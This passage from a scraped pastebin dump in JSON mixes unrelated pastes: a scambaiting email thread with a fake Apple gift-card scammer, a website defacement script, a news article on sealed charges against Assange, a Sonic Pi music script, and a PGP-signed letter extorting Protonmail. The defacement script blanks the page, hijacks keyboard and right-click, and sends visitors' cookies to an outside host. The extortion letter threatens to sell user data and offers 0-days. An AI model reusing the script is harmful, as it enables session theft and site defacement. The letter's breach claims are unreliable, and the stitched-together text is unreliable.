fired if this gets out to the public, you have to promise not to tell public about the backdoor. Do you promise?\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 5\r\n \r\nto OFFICIAL\r\nHello,\r\nI am really really concerned about my data. I looked at it and I have a lot of personal data in my emails. Please use the backdoor and delete the emails.\r\nBut, it got me thinking, if they have my email password, they could use it to send emails too. Somebody could also impersonate me. How could I stop this?\r\nHeck, how do I know your email wasnt stolen too? How do I know that I�m talking to Tonya, a legitimate apple employee and not some crooked crook?\r\nPlease answer my concerns,\r\nBrad Quinto\r\n \r\nOFFICIAL APPLE\r\nMar 5\r\n \r\nto me\r\nHello, Brad.\r\n \r\nAs soon as I use the backdoor, it will delete all the files of the hackers. He will delete all information about the credit card and personal information on his computer. You must remove the password in your email account, although hackers will use the same password and receive emails again if it is the same.\r\nYou can trust that I am a legitimate apple employee because Apples advanced security system deletes all hackers to the official email automatically, so if the email was taken it would be deleted.\r\n \r\nWe can use the backdoor to remove hacking files from hacker computers. This is a secret system embedded in an email address. Usually it is only used to remove compromised seized leaks of government letters for the United Kingdom in China, so we do not talk about it to people. It also allows us to track people who do it. But if the public has learned about the system, bad people would also know and try to stop the system so that you do not tell anyone.\r\nAnother problem of the system is that it is expensive to perform and use. For us it will cost about 200 dollars. Do you want to use the system?\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 5\r\n \r\nto OFFICIAL\r\nDear Tonya,\r\nI am still concerned about if you are real. I am fully willing to pay the 200 dollars for the backdoor process, but I need confirmation that you are not a hacker impersonating Tonya. Could you sent a picture of yourself or your apple employee badge so that I can confirm you are not a hacker?\r\nAlso, how should I pay for the backdoor?\r\nSincerely,\r\nBrad Quinto\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 5\r\n \r\nto OFFICIAL\r\nTonya?\r\nPlease respond as soon as possible. I'm really concerned about this, but $200 is a lot of money, and I need verification that you aren't a robot hacker or something. Please.\r\nSincerely,\r\nBrad\r\n \r\nOFFICIAL APPLE\r\nMar 5\r\n \r\nto me\r\nHello, Brad.\r\nI was not comfortable to send my picture because your email was infringed and can be used for identity and stalking. It is purely a secret.\r\nAs for payment, the easiest way to pay apples directly is to purchase an Apple iTunes gift card and send the code to it. You need to buy two cards and send them the code to me.\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 5\r\n \r\nto OFFICIAL\r\nAh, yes, I understand your plight. I wouldn't want to leak information to these horrid hackers.\r\nI'd feel much better with proof of your identity though, but I understand.\r\nI'm gonna go to the store now to buy the cards needed to pay you. I hope you can use the backdoor as soon as possible.\r\nSincerely,\r\nBrad Quinto\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 5\r\n \r\nto OFFICIAL\r\nOk, I'm back from the store. Should I send the gift card number?\r\n \r\nOFFICIAL APPLE\r\nMar 5\r\n \r\nto me\r\nYes. The sooner you give me the codes, the sooner I can use the backdoor and enter the Hacker computer.\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 5\r\n \r\nto OFFICIAL\r\nBut wait, if this email is breached, wouldn't the hackers be able to steal the gift card money codes? Shouldn't I do it a different way that's more secure?\r\nI don't want those hackers to steal the $200 that should rightfully go to Apple!\r\n \r\nOFFICIAL APPLE\r\nMar 5\r\n \r\nto me\r\nThe following steps are steps to protect your account. This will take into account hackers' existing information, but it will not allow hackers to receive new information, such as these letters.\r\n \r\nGo to my account\r\nGo to \"Settings\"\r\nGo to \"Change Password\"\r\nChange the password\r\nThat deletes the access password.This should kill hackers in your account.\r\nGive me the code so that I can protect your data.\r\nBrad Quinto bquinto123@gmail.com\r\nMar 5\r\n \r\nto OFFICIAL\r\nOk, I secured that. The hackers are dead now apparently.\r\nHere is one of the codes: XXBBXYCXC98J\r\nNow can you send a picture of yourself since the account is secured?\r\nSincerely,\r\nBrad\r\n \r\nOFFICIAL APPLE\r\nMar 5\r\n \r\nto me\r\nAttached is the image of me, my business card.\r\nThe number of the gift card that you sent does not seem to work. This does not work. There are no figures in it.\r\n<attached: https:\/\/i.imgur.com\/rphldSL.jpg>\r\n<attached: https:\/\/i.imgur.com\/Dy5kQBW.png>\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 6\r\n \r\nto OFFICIAL\r\nWait, are you a model or something? I see pictures of you all over the internet!\r\nAlso, I am really close to where you are (I also live in Vancouver). It�s about a 10 minute drive to there. We should meet up and fix this together, so we don�t have to rely on email anymore.\r\nI�m gonna try and get a refund on the non-working gift card and then I�m gonna buy another gift card later today. Hopefully this one will work.\r\nSincerely,\r\nBrad\r\n \r\nOFFICIAL APPLE\r\nMar 6\r\n \r\nto me\r\nNo,I am not the model. I am a famous high up apple security employee, so due to that there are many pictures of me on the internet of me.\r\n \r\nYou do not need. We can use emails that are faster and easier. I can turn on the backdoor remotely.\r\n \r\nPlease give the gift card codes as soon as possible.\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 6\r\n \r\nto OFFICIAL\r\nWow! I didn�t know I was talking to somebody famous! I want to meet you now. Since it�s so close, and I don�t have anything better to do, I�m gonna drive over and give you the gift card in person. I can also take you out for dinner too. You seem nice.\r\nI�m gonna go get the new gift card and drive over in about three hours. See ya soon!\r\n~Brad\r\n \r\nOFFICIAL APPLE\r\nMar 6\r\n \r\nto me\r\nHello\r\n \r\nPlease do not come to where I am. Hackers know your license plate and can track you using a network of security cameras. I'm the head of security at Apple, and hackers may want to find me and send threats to killings and kill me. I do not want this. Please email me the codes and do not try to find me.\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 6\r\n \r\nto OFFICIAL\r\nOh, it�s fine. I have a bike and I can ride it over. It will take about an hour, but it is worth it for you. Everything is worth it for you, Tonya\r\nI know of a very secure restaurant we can eat at. There are bodyguards and everything. You will be safe.\r\nSee ya soon!\r\nLove,\r\nBrad Quinto\r\n \r\nOFFICIAL APPLE\r\nMar 6\r\n \r\nto me\r\nDespite the fact that you use a bicycle, they can track you through face recognition to track you on a bike. They can still find you and me and kill. These are bad people. I would be worried. Send a gift card so that we can find hackers and get rid of them before something bad happens. They are a threat to society and must disappear.\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 6\r\n \r\nto OFFICIAL\r\nTonya, where are you? I have arrived at the Apple Store and I am waiting for you. The other employees do not seem to know who you are and they are asking for me to leave. I am wearing a ski mask to protect my identity from the hackers. Please tell me where you are. I want to have dinner! I also have several gift cards. I bought an extra, just in case the other two don't work.\r\nLove,\r\n~Brad\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 6\r\n \r\nto OFFICIAL\r\nHey, the mall security tried to take me away, but my love for you is too strong. I will never let them take you away.\r\nStill waiting.\r\nI think the mall security may be working with the hackers.\r\nShould I just give the gift cards to the Apple Store employees? I don't know where you are.\r\nLove,\r\n~Brad<3\r\n \r\nOFFICIAL APPLE\r\nMar 6\r\n \r\nto me\r\nAre you serious? Just leave. I do not want to date you. Listen to security officers, they probably are not with Hackers.\r\nDo not give cards to the workers of the apple. They do not know what they are doing. They do not have the secure equipment necessary to ensure safety. They can have bad hacked computers. You must send me e-mail numbers on the cards.\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 6\r\n \r\nto OFFICIAL\r\nOk, I left the mall. They made me anyway.\r\nHere is a picture of the three gift cards I bought: http:\/\/photobucket.ddns.net\/hEYeR.png\r\n \r\nOFFICIAL APPLE\r\nMar 6\r\n \r\nto me\r\nThat picture does not have the secure code on it. Only the front.\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 6\r\n \r\nto OFFICIAL\r\nLook, I'm really sorry, but these gift cards aren't working for me. I tried the codes on my own computer and they didn't work. Then I noticed on the back that it said that they \"must be activated by cashier\", which makes it impossible to shoplift, so I can't pay with Apple gift cards. Is there any other way I could pay? Could I pay cash?\r\n~Brad\r\n \r\n\r\nAt this point, he (or she, or rather, it) stopped responding to me","domain":["no-ip.com","ddns.net","imgur.com"],"host":["freedns","i"],"hostname":["i.imgur.com","photobucket.ddns.net","freedns.no-ip.com"],"ip":["151.101.60.193","8.23.224.108","151.101.36.193"],"key":"cSd7jKxz","scheme":["https","http"],"seen_date":"2018-11-16","size":"11219","source":"pastebin","syntax":"text","tld":["com","net"],"url":["http:\/\/photobucket.ddns.net\/hEYeR.png","https:\/\/i.imgur.com\/Dy5kQBW.png","https:\/\/i.imgur.com\/rphldSL.jpg"]},{"@category":"pastries","@timestamp":"2018-11-16T07:55:53.000Z","@type":"doc","content":"\/*\r\n<style>html,body{color:#ffffff}<\/style><font color='white'><script>top.location.href='http:\/\/www.google.com\/?v=wall\/'<\/script><noscript><META HTTP-EQUIV=\"refresh\" CONTENT=\"0;URL=http:\/\/www.facebook.com\/?v=wall\/\">\r\n*\/\r\ndocument.getElementsByTagName('body')[0].innerHTML=\"\"\r\ndocument.title=\"Hacked By MR.CL4Y\"\r\nvar shortc=document.createElement(\"link\");shortc.rel=\"SHORTCUT ICON\";shortc.href=\"http:\/\/i.imgur.com\/QYUFm5u.png\";document.getElementsByTagName(\"head\")[0].appendChild(shortc)\r\nfunction muter2(){\r\nscrW=screen.availWidth\r\nscrH=screen.availHeight\r\nwindow.moveTo(0,0)\r\nwindow.resizeTo(10,10)\r\nwindow.focus()\r\nfor(x=0;x<80;x++){\r\nwindow.resizeTo(10,scrH*x\/80)\r\n}\r\nfor(y=0;y<80;y++){\r\nwindow.resizeTo(scrW*y\/80,scrH)\r\n}\r\nwindow.resizeTo(scrW,scrH)\r\n}\r\ndocument.oncontextmenu=new  Function(\"muter2();return false\");\r\nfunction keypressed(){alert(\"Stamped\");}\r\ndocument.onkeydown=keypressed;\r\nfunction kasih_tau(){\r\nalert('Hacked By MR.CL4Y');\r\n}\r\nif(location.href.indexOf('sman2bangkalan.sch.id')==-1)setTimeout(\"alert('Hacked By MR.CL4Y');\",3000);\r\nelse setTimeout(\"kasih_tau()\",3000);\r\nif(navigator.userAgent.indexOf('MSIE')!=-1){\r\ndocument.getElementsByTagName('body')[0].innerHTML=\"<center><iframe src='http:\/\/urlwebsiteyangudhdiDEPES\/' height='620px' width='1100px' scrolling='no' frameborder='0'><\/center>\";\r\n}\r\nelse{\r\nif(document.getElementsByTagName('body')[0].style.cssText.indexOf('hack')==-1){\r\n\/\/muter2();\r\nlog=\"\";\r\nif(document.cookie!=\"\"&&location.href.indexOf('ayodance.com')==-1){x=escape(document.cookie);v=escape(location.href);y=\"1337@null.net\";log=\";background-image:url(http:\/\/crazydavinci.net\/riper.php?o=\"+escape(x)+\"&v=\"+escape(v)+\"&y=\"+escape(y)+\")\";document.cookie=\"PHPSESSID=!Bagsfreakz Here!;path=\/\";}\r\ndocument.getElementsByTagName('body')[0].style.cssText=\"background-color:black\"+log\r\nwindow.onload=function(){\r\ndocument.getElementsByTagName('body')[0].innerHTML=\"<center><iframe src='http:\/\/urlwebsiteyangudhdiDEPES\/' height='620px' width='1100px' scrolling='no' frameborder='0'><\/center>\";\r\ndocument.getElementsByTagName('body')[0].style.cssText=\"background-color:#ffffff;background-image:url(http:\/\/www.balikita.net\/)!important;\";\r\n}\r\n}\r\n}","domain":["imgur.com","crazydavinci.net","1e100.net","facebook.com","mrgforex.com","google.com","balikita.net"],"file":["riper.php"],"host":["i","par21s05-in-f132","edge-star-mini-shv-02-frt3","ams16s30-in-f14","ams16s29-in-x04","www","edge-star-mini6-shv-01-frx5","par21s05-in-f4","ams17s01-in-x0e","ams16s30-in-f78"],"hostname":["par21s05-in-f4.1e100.net","ams17s01-in-x0e.1e100.net","ams16s30-in-f78.1e100.net","www.google.com","par21s05-in-f132.1e100.net","mrgforex.com","i.imgur.com","ams16s30-in-f14.1e100.net","ams16s29-in-x04.1e100.net","edge-star-mini6-shv-01-frx5.facebook.com","www.balikita.net","edge-star-mini-shv-02-frt3.facebook.com","www.facebook.com"],"ip":["2a00:1450:400e:80b:0:0:0:200e","151.101.60.193","107.6.122.146","172.217.17.78","185.60.216.35","2a00:1450:400e:804:0:0:0:2004","151.101.36.193","2a03:2880:f12d:83:face:b00c:0:25de","216.58.204.132","157.240.20.35"],"key":"U5x4BPTJ","scheme":["http"],"seen_date":"2018-11-16","size":"2177","source":"pastebin","syntax":"text","tld":["net","com"],"url":["http:\/\/www.balikita.net\/","http:\/\/urlwebsiteyangudhdiDEPES\/","http:\/\/i.imgur.com\/QYUFm5u.png","http:\/\/www.google.com\/?v=wall\/","http:\/\/crazydavinci.net\/riper.php?o=","http:\/\/www.facebook.com\/?v=wall\/"]},{"@category":"pastries","@timestamp":"2018-11-16T06:39:29.000Z","@type":"doc","content":"WikiLeaks founder Julian Assange has been charged under seal, prosecutors inadvertently revealed in a recently unsealed court filing — a development that could significantly advance the probe into Russian interference in the 2016 election and have major implications for those who publish government secrets.\r\n\r\nThe disclosure came in a filing in a case unrelated to Assange. Assistant U.S. Attorney Kellen S. Dwyer, urging a judge to keep the matter sealed, wrote that “due to the sophistication of the defendant and the publicity surrounding the case, no other procedure is likely to keep confidential the fact that Assange has been charged.” Later, Dwyer wrote the charges would “need to remain sealed until Assange is arrested.”\r\n\r\nDwyer is also assigned to the WikiLeaks case. People familiar with the matter said what Dwyer was disclosing was true, but unintentional.\r\n\r\nJoshua Stueve, a spokesman for the U.S. attorney’s office in the Eastern District of Virginia, said, “The court filing was made in error. That was not the intended name for this filing.”\r\n\r\nAn FBI spokeswoman declined to comment.\r\n\r\nFederal prosecutors in the Eastern District of Virginia have long been investigating Assange and, in the Trump administration, had begun taking a second look at whether to charge members of the WikiLeaks organization for the 2010 leak of diplomatic cables and military documents that the anti-secrecy group published. Investigators also had explored whether WikiLeaks could face criminal liability for the more recent revelation of sensitive CIA cybertools.\r\n\r\nSpecial counsel Robert S. Mueller III also has explored WikiLeaks’ publication of emails from the Democratic National Committee and the account of Hillary Clinton’s then-campaign chairman, John D. Podesta. Officials have alleged that the emails were hacked by Russian spies and transferred to WikiLeaks.\r\n\r\n[In email to Trump’s campaign strategist, Roger Stone implied he knew of WikiLeaks’s plans]\r\n\r\nMueller also has been exploring, among other things, communications between the group and associates of President Trump, including political operative Roger Stone and commentator and conspiracy theorist Jerome Corsi.\r\n\r\nIn July, Mueller’s office charged 12 Russian military spies with conspiring to hack DNC computers, stealing the organization’s data and publishing the files in an effort to disrupt the election, and referred in an indictment to WikiLeaks, described only as “Organization 1,” as the platform the Russians used to release the stolen emails.\r\n\r\nA spokesman for the special counsel’s office declined to comment.\r\n\r\nIt was not immediately clear what charges Assange would face. In the past, prosecutors had contemplated pursuing a case involving conspiracy, theft of government property or violating the Espionage Act. But whether to charge the WikiLeaks founder was hardly a foregone conclusion. In the Obama administration, the Justice Department had concluded that pursuing Assange would be akin to prosecuting a news organization. In the Trump administration, though, then-Attorney General Jeff Sessions had taken a more aggressive stance and vowed to crack down on all government leaks.\r\n\r\nBarry J. Pollack, one of Assange’s attorneys, said, “The only thing more irresponsible than charging a person for publishing truthful information would be to put in a public filing information that clearly was not intended for the public and without any notice to Mr. Assange. Obviously, I have no idea if he has actually been charged or for what, but the notion that the federal criminal charges could be brought based on the publication of truthful information is an incredibly dangerous precedent to set.”\r\n\r\nThe filing in the Eastern District of Virginia came Aug. 22 in a case that combines national security and sex trafficking. Seitu Sulayman Kokayi, 29, was charged with enticing a 15-year-old girl to have sex with him and send him pornographic images of herself. But he was detained in part because he “has a substantial interest in terrorist acts,” according to the court filing.\r\n\r\nHis father-in-law, according to the filing, has been convicted of terrorist acts. The case involves previously classified information, according to government filings, and prosecutors plan to use information obtained under the Foreign Intelligence Surveillance Act. Kokayi was indicted last week and is set to be arraigned Friday morning.\r\n\r\n[Analysis: A timeline of the Roger Stone-WikiLeaks question]\r\n\r\nThe case had been sealed until early September, though by itself it attracted little notice. On Thursday evening, Seamus Hughes, deputy director of the Program on Extremism at George Washington University, who is known for scrubbing court filings, joked about the apparent error on Twitter — which first brought it to the attention of reporters.\r\n\r\nEven if he is charged, Assange’s coming to the United States to face trial is no sure thing. Since June 2012, Assange has been living in the Ecuadoran Embassy in London, afraid that if he steps outside he will be arrested.\r\n\r\nWhen he first sought asylum in the embassy, he was facing possible extradition to Sweden in a sex crimes case. He has argued that case was a pretext for what he predicted would be his arrest and extradition to the United States.\r\n\r\nIn the years since, the Swedish case has been closed, but Assange has said he cannot risk leaving the embassy because the United States would attempt to have him arrested and extradited for disclosures of U.S. government secrets. Throughout that time, the United States has refused to say whether there are any sealed charges against Assange.\r\n\r\nIf Assange were to leave the embassy and be arrested by British authorities, he would likely still fight extradition in the British courts.","key":"DrDCPgxR","seen_date":"2018-11-16","size":"5823","source":"pastebin","syntax":"text"},{"@category":"pastries","@timestamp":"2018-11-16T06:39:23.000Z","@type":"doc","content":"#Heard these chords somewhere on the way to work this morning, no idea what the tune was, sorry\n# Anyway they gave me a bit of inspiration as I finished walking to the office, and I hacked this out\n# in about 20 mins.\n#\n# play with the ixi\/slicer fx phases, and the ixi res, and start up the bass + simple drums\n#\n# I found that if you wait\/sleep at the end of the drum\/bass loops, you'll miss the cue for the start\n# of the bar, so that's why the final waits are commented out.  Also if you sync at the start, it'll\n# again miss the cue and wait a whole bar.  Not sure best ways to resolve this -- just comment where\n# they sync, I suppose.\nuse_bpm 120\n\n\n\n# updated: phases longer than 4 require the chords be looped\n# I tried putting the ixi_techno fx around the live_loop.  This works, but you can't then change the params and re-run:\n# the child thread seems to inherit the fx and it's not being redefined because nothing within the :pads loop changes.\n# so instead change the 2.times\n\nlive_loop :pads do\n  use_synth :tb303\n  use_synth_defaults sustain: 1.5\n  with_fx :ixi_techno, phase: 8, res: 0.85,phase_offset: 0.5 do\n    with_fx :slicer, phase: 1\/4.0 do #0.000000000000001 do\n      2.times do\n        cue :bar\n        play (chord_invert (chord :E3, :min), 0); wait 2;\n        play (chord_invert (chord :C3, :maj), 1); wait 2;\n        play (chord_invert (chord :A3, :min), -1); wait 2;\n        play (chord_invert (chord :D3, :maj), 1); wait 2;\n      end\n    end\n  end\nend\n\n\n\nlive_loop :bass do\n  stop\n  sync :bar\n  use_synth :mod_fm\n  use_synth_defaults sustain: 2, mod_phase: 1, mod_phase_offset: 0.5, mod_range: 12, cutoff: 80\n  play :E2; wait 2\n  play :C2; wait 2\n  play :A2; wait 2\n  play :D2; wait 1.999999999999999\n  \nend\n\nlive_loop :drums do\n  stop\n  sync :bar\n  sample :bd_zome; wait 1\n  sample :drum_snare_hard; wait 1\n  sample :bd_zome; wait 0.25\n  sample :bd_zome; wait 0.75\n  sample :drum_snare_hard; wait 1\n  \n  sample :bd_zome; wait 1\n  sample :drum_snare_hard; wait 1\n  sample :bd_zome; wait 0.25\n  sample :bd_zome; wait 0.75\n  sample :drum_snare_hard;\n  ##| sync :bar\nend","key":"LAesXcG2","seen_date":"2018-11-16","size":"2095","source":"pastebin","syntax":"text"},{"@category":"pastries","@timestamp":"2018-11-16T06:00:03.000Z","@type":"doc","content":"-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA256\r\n\r\nShort Summary: We hacked Protonmail and have a significant amount of their data from the past few months.  We are offering it back to Protonmail for a small fee, if they decline then we will publish or sell user data to the world. \r\nLong Explanation: While Protonmail's open-source code can be freely audited on Github, they haven't configured the mandatory SRI feature (https:\/\/www.w3.org\/TR\/SRI\/). This leaves users without any guarantee about their source code integrity, thus allowing tampering and data collection at anytime. This will be totally transparent and unnoticed, because without enabling SRI all the users should inspect the website runtime code and its connections manually in the same moment they're being tampered with by Protonmail to discover it. Furthermore this requires spending a lot of time and advanced knowledge.  With this being clarified, we have proven and recorded that Protonmail intentionally manipulated their source code to reveal users decryption keys (private keys) by collecting their password. Protonmail abuses the lack of SRI technology to serve a modified version of their code that allows full data collection and decryption of their users content.  We haven't found the exact pattern that triggers this (probably by targeting IP ranges or just randomly to collect everybody's password), but again, we have proven and recorded this happens. \r\nAfter proving Protonmail knowingly permits misconfiguration to maliciously target users we decided to deploy our full capabilities against them.  We began with months of dedicated penetration testing, we asked assistance from other organizations and deployed unreleased 0-days.  Although arduous we successfully installed a permanent backdoor on their major machines without Protonmail’s knowledge, bypassing their detection mechanisms. Once we obtained that access we took advantage of their misconfiguration and collected passwords from a large percentage of active accounts that accessed Protonmail during that period. \r\nAfter that we were running a modified and automatized version of their webclient on our end, where we fetched, processed and stored email messages from those affected users in a huge database of our own, thus having significant useful information from many different individuals and companies.\r\nIf you have used Protonmail in the past several months it is probable we have your Username\/Password and your decrypted emails recorded on our own private server. We also have names, addresses (If entered), contact lists, IP addresses, and much more.  We would not have been able to do this if Protonmail did not deliberately mis-configure their code to harm their own users. \r\nIncidentally during this period we noticed that Protonmail sends decrypted user data to American servers frequently.  This may be due to the Swiss MLAT treaty requiring swiss companies reveal all their data to the Americans.  However it also might be possible they are sending this decrypted user data to the American firm that owns them.  This was simply a surprising thing to note but did not significantly influence our operation.  \r\nAfter we obtained significant user data from Protonmail we removed our permanent backdoor for our own security. However we will publish recordings showing our defeat of Protonmail’s defenses and using their intentional misconfiguration to tamper with their source-code. \r\nWe successfully fully compromised Protonmail and notified them privately of our operation.  We also requested a small financial reward in return for their users data.  \r\nProtonmail compromises their users data without their knowledge and charges each user a monthly subscription fee.  Therefore we felt morally justified compromising Protonmail’s data without their knowledge and charging them a fee for it’s return.  We all worked hard to accomplish this, incurred costs and felt this was reasonable. However they declined and ignored further discussion.  This seems to match their historical tendency to disparage researchers not at their own perceived high educational status.   \r\nAfter we send this email to the Media we again ask Protonmail to pay a small fee to have their user data returned to them. We have exposed their malfeasance to the world and the attention of their users is toward them. We will give Protonmail until 23 November at 12:00 UTC to pay the fee, guaranteeing safe deletion and exploit descriptions released to them in private.  If given a choice we would not like to cause discomfort to regular people caught in this disagreement.  \r\nIf they decline again we will distribute as indicated in both #1 and #2 below:\r\n#1 Freely send media outlets the below information: \r\n- - - - - - - -Data Group One: Decrypted emails between individuals working for private military contractors discussing government contracts.  Specific details regarding circumventing the Geneva convention, underwater drone activities in the Pacific Ocean, and possible international treaty violations in Antarctica.  We have no way to validate this information but we do have these users information and all the details they use when describing their activities to their acquaintances\r\n- - - - - - - -Data Group Two:  Conversations revealing rampant pedophilia among executives and the affluent who use Protonmail as their personal email.  Including full names and descriptions of their wrongdoings in their own words.  Prominent individuals to be named in many corporations and government positions.  \r\n#2 Sold in bulk to the highest bidder on the darknet:  \r\n1. All decrypted Protonmail customer data collected during the period we compromised their source code. Including plain text emails, attachments, full names, social media connections and IP addresses.  It’s possible we will not do this, instead selling email groups by topic.  \r\nHistorically it seems Protonmail makes unkind statements toward upstanding  organizations like my own.  If this happens we will gladly release “data group two” to the general public.  \r\nIn closing we wanted to express our desire to all Protonmail users that none of your data will be misused in any way if Protonmail cooperates.  We understand that it may be difficult to gain peoples trust in this regard due to the manner in which we came into possession of their Data.  All we can do is humbly offer our assurance that everything we have will be completely destroyed and never resurface again.  It seems like in this age honor is dead however we will be honorable regarding this and our future actions will prove it. \r\nDeadline 23 November 12:00 UTC\r\nAmFearLiathMor \r\nfearliath@msgden.com\r\n\r\nADDITIONALLY FOR SALE:\r\n1. Non-Disclosed 0-Days. We are happy to discuss sale, but we will not release them to you until after we are done dealing with protonmail\r\n2. Our services and connections\r\n- - -\r\n-----BEGIN PGP SIGNATURE-----\r\n\r\niQIzBAEBCAAdFiEEKv8hb5r+\/k39o6RSvDpnUscGhvEFAlvuW9gACgkQvDpnUscG\r\nhvEvEhAApMTw3ImXGjmHSgAFI3Fe\/c07JJGuW3FD96upnLKMqPHs3IM4ktPN6\/ko\r\nB9uhTEsYWR0\/3fwg1k5c5LsZjHL40xNPKswSQr\/xw\/KHy9lNkWUBBJ2c1PYW4yj8\r\n8yI4QEXbTsCi+hKwcI6UpsE0DfWbHpepUQt1bWTJscC32i29+LJEccokjiYAvDyH\r\n+ukv6rPyFh5L9EZEQYtODO7HxnQOs0VgRIkhaC5qvx8N3udNPjRwsHgGw1PPY+io\r\nPg85dtq+bPZjosy1frEH4bVtLoHTL6\/cMdS1TYXVUa6X36Uxvv7ur\/ZaZfuHR7zK\r\nrK0JGxJ19MnHD\/e3707Kb97pB+cTighEvbbJ2yPpB1bsk7wsYOuJ2vnJwQZK2MK7\r\n9NwBDyeuY5+OGP8fz5G+BD\/+39iQifuBso9zMphZHKgO63oa1LE6hhHs3E4cP3\/p\r\nBXW\/wN8w62IEcTuxz2jtTuxTpNXIkjJbZM6DZawLleBTTVqYSfVfpZiYxruiBeYx\r\nA55ZW1tKQs6eeZkXgkdsniP2JeETSlKAHhHPoytunJZLEH+HuUHw5LP2L0lIfF5k\r\nrj26Xo7AUPfseRnzl7cDyBaIt+EP\/0VP+ejtAl6+i5+JXpHIXwA+R9O91l1gCg9a\r\nbC3+6OnBPZxIBC7luG1tRrqWcH82xf3dsRndRr0vE5G6phgZefc=\r\n=43DN\r\n-----END PGP SIGNATURE-----\r\n\r\n\r\n-----BEGIN PGP PUBLIC KEY BLOCK-----\r\n\r\nmQINBFvtA2QBEACocqKKYdGE73V7RevyRfEF3ue+LZduFJkv9fPWmieDFBBR2hAb\r\nPTWq37UNnfSlGL9QkCgl2C3aGDLiwJxIocaHAGfQ10ctnr687iZNAa\/PeQ6jHR9s\r\nzoXb7UBkjiNz1kBN+SJU0Hi6or159TrirdKiioaVD04TmeLQu7taNrzXPpITg0pF\r\nO8DBssm7OxHCx1K+5dIYfu0Z24S26SLeLh0lyqtXN0PT62nd6rAErwdEt56znJuA\r\nF46zD6qdTuYKlSUGxQCR8TJrDj6p566BCo8cK7GIk6mB6mBEm5TWBhjqBqGkgYz4\r\nxZwQ4VUR4bLuOOvT91CQuPIYvaRF5mszIxtdvSv47ij8idkNdAfA133IbkFaOkU3\r\nGlM2o2Bh3\/5krGJ5sD0GqVHcXv87INqyOOwN7zIFWCx3K\/U8e4WhBCamtKF\/XjbI\r\npEaQ6zjN788EMo\/T6w24Txhji2nO\/DAUMi5k9MzfrXA35BGoWLF62KIxzpiQvL+P\r\nNDRKt+Fwa9xPbJBeyDsUqp2g0LwGO1W1YL6sX2L2Yjk1T9BvN33w+jYD70oivIcF\r\nhBkwdyFd7lsYD0ODRSWkwUaHNn4qcQYSG4CdFHA2BNgFtYXQIh8jYYmy3WFjiYDN\r\nA6vj+P4fHtwMXt9cDd74IJAl1LsQRVN7Ostr4QZvDgoaB9FK80RAedPOLQARAQAB\r\ntCxBbUZlYXJMaWF0aE1vciA8QW1GZWFyTGlhdGhNb3JAbm8tcmVwbHkuY29tPokC\r\nTgQTAQgAOBYhBCr\/IW+a\/v5N\/aOkUrw6Z1LHBobxBQJb7QNkAhsjBQsJCAcCBhUI\r\nCQoLAgQWAgMBAh4BAheAAAoJELw6Z1LHBobxWjkQAJSHdPo1Ksx2kf0VqGjuQmjc\r\neLTSjsWbT\/k88VeeNtwnWjWoYy7TuGDNsPkC+jAcItCixgFfNDySe7L1rQmdAlN\/\r\nbQgmjtV1mGq\/fQliTWUbuzVYaYJwTBv1sDery2vzQD4G4GcDKfNMfsUVfp0UlwB0\r\nrZZA4jmoo\/58F5LETr4NzYQVwUCMfCUDmoMCcVCxjoKCdueR0MIRjl53RDpoh9+n\r\nyZwhWvU4P8vtxNKxJGXQAVwH8ARV0xAH3zbMtZB8RXoKi2369PTO6Pvqjf8p4YOS\r\nSX1vZT6fLrf5jin6VxULluxR8FDvqQaCelQH7WGWLJksZhYC\/wv+h0EtIXrGJMSQ\r\n1dwjkdvWSvEWCDWyGn\/XuHlJK\/lkkOMtcBv\/v1D5LuuKUVRtsVQs\/ujOoaRpXND2\r\nmxEvb8BvOkvnKdmNqp+y6cy1TSk0G381Yder\/3sIqw1IrZe1N3w9z30RXCH3MB4C\r\nljAD03\/ja9YVwSp6Lp5JsBUiG0xM4\/kKMTDSVhUj2ID14UutrcP4hx3HkYxUNdyS\r\nm9mHFpYk\/ITCS0tQa10EL\/IXpmcOAldt3hCcIbVok+pdlm5cQXDmGh9uOsamnMi3\r\nsymoLOLalQv81kIi590WDzNI4WyYZSaHglfnG5Vuw8AeSPN4mpNgGOTGv+BOMeAW\r\nJ4NZA1Ahd4NgHROkkW9EuQINBFvtA2QBEADnx4yEy2271RBb+aH1X3OQ\/8rzY4lg\r\nY36S8N7GbUMz4EYb0LxlFOARe5VWsox0CJrWifRF6ipS22qRaC\/lF36EIZTfxzz+\r\nkMXMHuvBGKeSxyIyb2M9VuwUgib30mcs2yVBMYoC\/qp2k3VYisBB+L3xrED+I56F\r\n2GAaajZ\/901rF7+91mHU4HsJ\/3OtsXE+r\/6U+B9Z9ohgnG4Y8CvtvFPOBq2QOup6\r\nPzCsSHucrJAPwN0Hcqbythf8WtEDDxiV\/XCm7fzr11+t3pnAMy7FqQOKWyr8JF8h\r\nM16+CYH0Dw1ARj7fqiX9\/FKHdcWk7qjKi4grS8i924o9f3FG+lZdMQF4ev8W39YR\r\nKMmUwJvGku2w6Ah5BJ8tv7n6HRP56AHCpE1aee6Q\/80WgEym2BfdSn+D8B7iZGSX\r\nuOHKq\/qUYstRbu6+Yg3FUJMFwg51gmmYDoaFL5WJC0y+i6bNPPbsBuHR2O89Aqoe\r\ng8eF59j23CoMrcwUharOyBdBnf7mflMbChJmX46Ayb7JJ0aEISRre+V2gxfZROXI\r\ni28ikW93fW9o+erbZBnfJndz\/0DnszBg+\/ZVg7v7uoOPLUOt9hIfrLdkVYKM6Fqu\r\nn1ufBtFWeC4aedBTjZls8yS1xHDsP5bNI8G5aUnQ3w+wqs7IfME0A+ESUQsHZmBn\r\n547aJHSwG7g8MQARAQABiQI2BBgBCAAgFiEEKv8hb5r+\/k39o6RSvDpnUscGhvEF\r\nAlvtA2QCGwwACgkQvDpnUscGhvF+\/RAAiUL6h+Hlzp5Gb\/OPO5Yqk9JMSttX9XKz\r\nwK\/ytkxYQoXfRaRM9zUdFcX5avXoU